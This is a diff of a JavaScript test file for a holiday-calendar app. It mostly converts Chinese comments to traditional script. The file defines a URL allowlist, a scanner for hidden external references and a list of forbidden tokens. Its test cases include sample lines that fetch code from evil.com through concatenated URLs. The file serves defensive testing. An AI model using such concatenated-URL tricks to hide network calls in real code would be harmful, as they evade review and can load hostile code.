@@ -7,11 +7,11 @@ import { dirname, join } from 'node:path';
 
 const root = join(dirname(fileURLToPath(import.meta.url)), '..');
 
-// 成品里允许出现的网址（R20 / R31）：逐字相等才放行，不是前缀匹配。
-//  - 三个假期数据来源模板（只有按「检查更新」或自动检查条件成立时才会请求）
-//  - 校验用的 gov.cn 前缀（只做字符串比较，从不请求）
-//  - 自定义网址的输入框占位示例（example.com 是 RFC 2606 保留的示例域名，从不请求）
-//  - 「导入文件的格式示例」里的出处链接（holiday-cn 2026.json 的 papers；只作显示 / 复制的文字，从不请求；Task 14 / R47）
+// 成品裡允許出現的網址（R20 / R31）：逐字相等才放行，不是字首匹配。
+//  - 三個假期資料來源模板（只有按「檢查更新」或自動檢查條件成立時才會請求）
+//  - 校驗用的 gov.cn 字首（只做字串比較，從不請求）
+//  - 自定義網址的輸入框佔位示例（example.com 是 RFC 2606 保留的示例域名，從不請求）
+//  - 「匯入檔案的格式示例」裡的出處連結（holiday-cn 2026.json 的 papers；只作顯示 / 複製的文字，從不請求；Task 14 / R47）
 export const URL_ALLOWLIST = Object.freeze([
   'https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/{year}.json',
   'https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json',
@@ -26,11 +26,11 @@ export const URL_ALLOWLIST = Object.freeze([
   'https://www.dgpa.gov.tw/FileConversion?filename=dgpa/files/202506/a52331bd-a189-466b-b0f0-cae3062bbf74.csv&nfix=&name=115%e5%b9%b4%e4%b8%ad%e8%8f%af%e6%b0%91%e5%9c%8b%e6%94%bf%e5%ba%9c%e8%a1%8c%e6%94%bf%e6%a9%9f%e9%97%9c%e8%be%a6%e5%85%ac%e6%97%a5%e6%9b%86%e8%a1%a8.csv',
   'https://www.dgpa.gov.tw/FileConversion?filename=dgpa/files/202607/f538b1ff-ba60-4c63-9477-10db8e6612d1.csv&nfix=&name=116%e5%b9%b4%e4%b8%ad%e8%8f%af%e6%b0%91%e5%9c%8b%e6%94%bf%e5%ba%9c%e8%a1%8c%e6%94%bf%e6%a9%9f%e9%97%9c%e8%be%a6%e5%85%ac%e6%97%a5%e6%9b%86%e8%a1%a8_utf8bom.csv',
 ]);
-// 不带主机名的 "https://" 只允许出现在这两个固定上下文里（R31），且成品里出现的次数固定（见下方 dist 测试）。
-// 其他任何裸 "https://"（例如 "https://" + host 的拼接）都会被当成 URL 报出来。
+// 不帶主機名的 "https://" 只允許出現在這兩個固定上下文裡（R31），且成品裡出現的次數固定（見下方 dist 測試）。
+// 其他任何裸 "https://"（例如 "https://" + host 的拼接）都會被當成 URL 報出來。
 export const BARE_SCHEME_CONTEXTS = Object.freeze([
-  'var SCHEME = "https://";', // holiday-data.js：校验自定义网址的前缀
-  '必须以 https:// 开头', // strings：自定义网址的错误提示 + 高级设置里常驻的格式提示（Task 14）
+  'var SCHEME = "https://";', // holiday-data.js：校驗自定義網址的字首
+  '必须以 https:// 开头', // strings：自定義網址的錯誤提示 + 進階設定裡常駐的格式提示（Task 14）
   '必須以 https:// 開頭',
 ]);
 const BARE_SCHEME_COUNTS = Object.freeze({ 'var SCHEME = "https://";': 1, '必须以 https:// 开头': 2, '必須以 https:// 開頭': 2 });
@@ -45,16 +45,16 @@ export function findExternalRefs(html) {
   if (/<embed\b/i.test(html)) problems.push('<embed>');
   if (/<object\b/i.test(html)) problems.push('<object>');
   if (/<source[^>]*\ssrc(set)?\s*=/i.test(html)) problems.push('<source src>');
-  // CSS 只在 <style> 与 style="" 里找（JS 里的 new URL( 不是 CSS）
+  // CSS 只在 <style> 與 style="" 裡找（JS 裡的 new URL( 不是 CSS）
   const css = [...html.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi), ...html.matchAll(/\sstyle\s*=\s*"([^"]*)"/gi)].map((m) => m[1]).join('\n');
   if (/\burl\(\s*(?!["']?data:)/i.test(css)) problems.push('CSS url(');
   if (/@import\b/i.test(css)) problems.push('CSS @import');
-  // 拼出来的网址：协议字面量后面接 +，或模板字符串里协议后面直接是 ${
+  // 拼出來的網址：協議字面量後面接 +，或模板字串裡協議後面直接是 ${
   if (/["'`]\s*(https?|wss?):\/\/\s*["'`]\s*\+/i.test(html)) problems.push('concatenated scheme');
   if (/(https?|wss?):\/\/\$\{/i.test(html)) problems.push('template-literal scheme');
   if (/\bimport\s*\(/.test(html)) problems.push('dynamic import(');
   if (/\bwss?:\/\//i.test(html)) problems.push('ws:// / wss://');
-  // 协议相对网址（//host…）出现在字符串或属性值的开头
+  // 協議相對網址（//host…）出現在字串或屬性值的開頭
   if (/(["'`]|=\s*)\/\/[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+/.test(html)) problems.push('protocol-relative //host');
   let rest = html;
   for (const ctx of BARE_SCHEME_CONTEXTS) rest = rest.split(ctx).join(' ');
@@ -87,7 +87,7 @@ test('allowlist is exact: allowed endpoints pass, anything else (incl. look-alik
   for (const u of URL_ALLOWLIST) assert.deepEqual(findExternalRefs(`<script>const a = '${u}';</script>`), [], u);
   const bad = [
     '<img src="https://x.com/a.png">',
-    '<img alt="" src="data:image/png;base64,AA">', // 任何 <img src> 都不允许
+    '<img alt="" src="data:image/png;base64,AA">', // 任何 <img src> 都不允許
     '<link rel="icon" href="https://x.com/f.ico">',
     '<link rel="preconnect" href="https://cdn.jsdelivr.net">',
     '<style>body{background:url(https://x.com/a.png)}</style>',
@@ -98,7 +98,7 @@ test('allowlist is exact: allowed endpoints pass, anything else (incl. look-alik
     '<object data="x"></object>',
     '<video><source src="https://x.com/a.mp4"></video>',
     '<picture><source srcset="a.png"></picture>',
-    // R31：评审复现的三种拼接（之前因为裸 "https://" 在白名单里而漏掉）
+    // R31：評審復現的三種拼接（之前因為裸 "https://" 在白名單裡而漏掉）
     '<script>fetch("https://"+"evil.com/a.js")</script>',
     "<script>fetch('https://' + host + '/x')</script>",
     '<script>import("https://"+h)</script>',
@@ -124,7 +124,7 @@ test('allowlist is exact: allowed endpoints pass, anything else (incl. look-alik
     "<script>fetch('http://evil.com/www.w3.org/')</script>",
   ];
   for (const b of bad) assert.ok(findExternalRefs(b).length > 0, `must be flagged: ${b}`);
-  // CSS 的 data: url 仍允许（目前没用到，但不是外部引用）
+  // CSS 的 data: url 仍允許（目前沒用到，但不是外部引用）
   assert.deepEqual(findExternalRefs('<style>a{background:url(data:image/png;base64,AA)}</style>'), []);
 });
 
@@ -146,10 +146,10 @@ test('dist: the bundled source URLs are exactly the three defaults (no extra end
   for (const u of URL_ALLOWLIST.slice(0, 3)) assert.ok(urls.has(u), `bundled: ${u}`);
 });
 
-// ---- Task 14 E2：结构检查（成品里的网络 / 解码 API 与 SCHEME 用法固定不变） ----
-// 成品不得出现这些（任何一个出现都可能被用来拼出或送出隐藏的网址）
+// ---- Task 14 E2：結構檢查（成品裡的網路 / 解碼 API 與 SCHEME 用法固定不變） ----
+// 成品不得出現這些（任何一個出現都可能被用來拼出或送出隱藏的網址）
 export const FORBIDDEN_TOKENS = Object.freeze(['fromCharCode', 'fromCodePoint', 'atob(', 'WebSocket', 'EventSource', 'sendBeacon', 'XMLHttpRequest', 'new Image']);
-// 已存假期年份的 source 校验（holiday-store.js）用正则字面量写协议，成品里是转义后的 https:\/\/；只允许这一处
+// 已存假期年份的 source 校驗（holiday-store.js）用正則字面量寫協議，成品裡是轉義後的 https:\/\/；只允許這一處
 const ESCAPED_SCHEME = /https?:\\\/\\\//gi;
 
 export function structuralProblems(html) {
